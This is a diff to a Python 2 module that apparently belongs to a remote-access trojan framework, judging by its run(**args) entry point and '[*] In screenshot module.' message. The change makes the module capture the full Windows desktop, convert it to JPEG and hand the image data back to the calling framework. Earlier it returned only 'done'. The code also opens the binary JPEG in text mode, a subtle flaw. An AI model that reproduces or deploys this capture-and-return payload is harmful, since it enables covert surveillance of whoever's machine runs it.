@@ -3,7 +3,12 @@ import win32ui
 import win32con
 import win32api
 
+import PIL.Image
 
+
+def bmp2jpg(bmp, jpg):
+    PIL.Image.open(bmp).save(jpg)
+    
 def get_screenshot():
     hdesktop = win32gui.GetDesktopWindow()
 
@@ -21,14 +26,23 @@ def get_screenshot():
     mem_dc.SelectObject(screenshot)
 
     mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
-    screenshot.SaveBitmapFile(mem_dc, "C:\\Users\\test\\Desktop\\screenshot.bmp")
+    bmp = "C:\\Users\\test\\Desktop\\screenshot.bmp"
+    screenshot.SaveBitmapFile(mem_dc, bmp)
+
+    # bmp2jpg
+    jpg = bmp[0:-4] + ".jpg"
+    bmp2jpg(bmp, jpg);
 
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
 
+    ff = open(jpg, "r")
+    data = ff.read()
+    return data
+
 
 def run(**args):
     print "[*] In screenshot module."
-    get_screenshot()
-    data = "done"
-    return str(data)
+    data = get_screenshot()
+    #data = "done"
+    return data
